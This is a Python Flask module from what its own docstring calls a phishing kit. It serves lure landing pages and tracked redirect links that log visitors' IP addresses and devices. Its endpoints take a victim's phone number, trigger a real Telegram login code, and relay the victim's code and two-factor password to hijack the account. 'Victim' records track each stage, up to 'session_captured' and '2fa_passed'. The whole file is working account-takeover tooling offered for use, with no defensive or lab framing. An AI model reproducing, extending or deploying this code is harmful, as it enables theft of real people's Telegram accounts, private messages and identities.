import re
import uuid
import asyncio
from flask import Blueprint, render_template, request, jsonify
from core.logger import log

public_bp = Blueprint('public', __name__)

# In-memory store for pending authentication sessions.
# Maps session_id -> {phone, phone_code_hash, session_string, timeout}
_pending_sessions: dict = {}

_PHONE_RE = re.compile(r'^\+\d{9,15}$')


def _get_visitor_info():
    """Extract IP and user agent from request."""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip:
        ip = ip.split(',')[0].strip()
    ua = request.headers.get('User-Agent', '')
    return ip, ua


def _parse_ua(ua: str) -> dict:
    """Parse basic device info from user agent string."""
    ua_lower = ua.lower()
    # OS detection
    if 'windows' in ua_lower:
        os_name = 'Windows'
    elif 'android' in ua_lower:
        os_name = 'Android'
    elif 'iphone' in ua_lower or 'ipad' in ua_lower:
        os_name = 'iOS'
    elif 'mac' in ua_lower:
        os_name = 'macOS'
    elif 'linux' in ua_lower:
        os_name = 'Linux'
    else:
        os_name = 'Unknown'
    # Browser detection
    if 'chrome' in ua_lower and 'chromium' not in ua_lower and 'edg' not in ua_lower:
        browser = 'Chrome'
    elif 'firefox' in ua_lower:
        browser = 'Firefox'
    elif 'safari' in ua_lower and 'chrome' not in ua_lower:
        browser = 'Safari'
    elif 'edg' in ua_lower:
        browser = 'Edge'
    elif 'opera' in ua_lower or 'opr' in ua_lower:
        browser = 'Opera'
    else:
        browser = 'Unknown'
    # Device type
    if 'mobile' in ua_lower or 'android' in ua_lower or 'iphone' in ua_lower:
        device = 'Mobile'
    elif 'tablet' in ua_lower or 'ipad' in ua_lower:
        device = 'Tablet'
    else:
        device = 'Desktop'
    return {'os': os_name, 'browser': browser, 'device': device}


def _upsert_victim(phone: str, ip: str, ua: str, status: str, **kwargs):
    """Create or update a Victim record."""
    try:
        from web.extensions import db
        from models.victim import Victim
        import datetime
        victim = db.session.query(Victim).filter(Victim.phone == phone).first()
        if not victim:
            ua_info = _parse_ua(ua)
            victim = Victim(
                phone=phone,
                ip=ip,
                user_agent=ua[:500] if ua else None,
                os=ua_info['os'],
                browser=ua_info['browser'],
                device=ua_info['device'],
                status=status,
            )
            db.session.add(victim)
        else:
            victim.status = status
        for k, v in kwargs.items():
            setattr(victim, k, v)
        db.session.commit()
    except Exception as e:
        log.debug(f"_upsert_victim error: {e}")
        try:
            from web.extensions import db
            db.session.rollback()
        except Exception:
            pass


@public_bp.route('/')
def index():
    """Serves the public-facing phishing landing page."""
    return render_template('index.html')


@public_bp.route('/p/<slug>')
def landing_page(slug):
    """Serve a landing page by slug from database."""
    try:
        from web.extensions import db
        from models.landing_page import LandingPage
        landing = db.session.query(LandingPage).filter(
            LandingPage.slug == slug,
            LandingPage.is_active == True,
        ).first()
        if not landing:
            return render_template('index.html')
        landing.visits = (landing.visits or 0) + 1
        db.session.commit()
        return render_template('landing_page.html', landing=landing)
    except Exception as e:
        log.error(f"landing_page error for slug={slug}: {e}")
        return render_template('index.html')


@public_bp.route('/l/<short_code>')
def tracked_link_redirect(short_code):
    """Public redirect for tracked links."""
    try:
        from web.extensions import db
        from models.tracked_link import TrackedLink, LinkClick
        import datetime
        link = db.session.query(TrackedLink).filter(
            TrackedLink.short_code == short_code,
            TrackedLink.is_active == True,
        ).first()
        if not link:
            return '', 404
        if link.expires_at and link.expires_at < datetime.datetime.utcnow():
            return '', 410
        ip, ua = _get_visitor_info()
        ua_info = _parse_ua(ua)
        click = LinkClick(
            link_id=link.id,
            ip=ip,
            user_agent=ua[:500] if ua else None,
            device_type=ua_info['device'],
            os=ua_info['os'],
            browser=ua_info['browser'],
            referer=request.headers.get('Referer', ''),
        )
        db.session.add(click)
        link.clicks = (link.clicks or 0) + 1
        db.session.commit()
        from flask import redirect as flask_redirect
        return flask_redirect(link.destination_url, code=302)
    except Exception as e:
        log.error(f"tracked_link_redirect error for code={short_code}: {e}")
        return '', 500


@public_bp.route('/api/send_code', methods=['POST'])
def api_send_code():
    """
    Accepts a phone number, initiates a Telegram sign-in code request,
    and returns a session ID for subsequent verification.
    """
    from services.telegram.authtelegram import send_code
    data = request.get_json(silent=True) or {}
    phone = str(data.get('phone', '')).strip()
    if not phone:
        return jsonify({'status': 'error', 'message': 'Phone number required'}), 400
    if not _PHONE_RE.match(phone):
        return jsonify({'status': 'error', 'message': 'Invalid phone number format. Must start with + followed by 9-15 digits.'}), 400

    ip, ua = _get_visitor_info()

    sid = uuid.uuid4().hex
    try:
        result = asyncio.run(send_code(phone, sid))
    except Exception as e:
        log.error(f"api_send_code error for phone={phone}: {e}")
        return jsonify({'status': 'error', 'message': 'Server error'}), 500

    if result.get('status') == 'success':
        _pending_sessions[sid] = {
            'phone': phone,
            'phone_code_hash': result['phone_code_hash'],
            'session_string': result['session_string'],
            'timeout': result.get('timeout', 120),
        }
        # Track victim
        _upsert_victim(phone, ip, ua, 'code_sent')
        return jsonify({'status': 'success', 'sid': sid, 'timeout': result.get('timeout', 120)})

    return jsonify(result)


@public_bp.route('/api/verify', methods=['POST'])
def api_verify():
    """
    Verifies the Telegram sign-in code (and optionally the 2FA cloud password).
    Cleans up the pending session on success.
    """
    from services.telegram.authtelegram import sign_in, sign_in_2fa
    data = request.get_json(silent=True) or {}
    sid = data.get('sid', '')
    code = data.get('code', '')
    password = data.get('password')

    session = _pending_sessions.get(sid)
    if not session:
        return jsonify({'status': 'error', 'message': 'Session expired or not found'}), 400

    ip, ua = _get_visitor_info()

    try:
        if password:
            result = asyncio.run(
                sign_in_2fa(password, sid, session['session_string'])
            )
        else:
            result = asyncio.run(
                sign_in(code, sid, session['phone'],
                        session['phone_code_hash'], session['session_string'])
            )
    except Exception as e:
        log.error(f"api_verify error for sid={sid}: {e}")
        return jsonify({'status': 'error', 'message': 'Server error'}), 500

    if result.get('status') == 'success':
        import datetime
        _upsert_victim(
            session['phone'], ip, ua, 'logged_in',
            session_captured=True,
            login_at=datetime.datetime.utcnow(),
        )
        _pending_sessions.pop(sid, None)
    elif result.get('status') == 'need_2fa':
        # Update status but keep pending session for 2fa step
        _upsert_victim(session['phone'], ip, ua, 'code_entered')
        # Store the updated session_string if returned
        updated_session = result.get('session_string')
        if updated_session:
            _pending_sessions[sid]['session_string'] = updated_session

    return jsonify(result)


@public_bp.route('/api/verify_2fa', methods=['POST'])
def api_verify_2fa():
    """Separate endpoint for 2FA password verification."""
    from services.telegram.authtelegram import sign_in_2fa
    data = request.get_json(silent=True) or {}
    sid = data.get('sid', '')
    password = data.get('password', '')

    session = _pending_sessions.get(sid)
    if not session:
        return jsonify({'status': 'error', 'message': 'Session expired or not found'}), 400

    ip, ua = _get_visitor_info()

    try:
        result = asyncio.run(sign_in_2fa(password, sid, session['session_string']))
    except Exception as e:
        log.error(f"api_verify_2fa error for sid={sid}: {e}")
        return jsonify({'status': 'error', 'message': 'Server error'}), 500

    if result.get('status') == 'success':
        import datetime
        _upsert_victim(
            session['phone'], ip, ua, '2fa_passed',
            twofa_captured=True,
            login_at=datetime.datetime.utcnow(),
        )
        _pending_sessions.pop(sid, None)

    return jsonify(result)
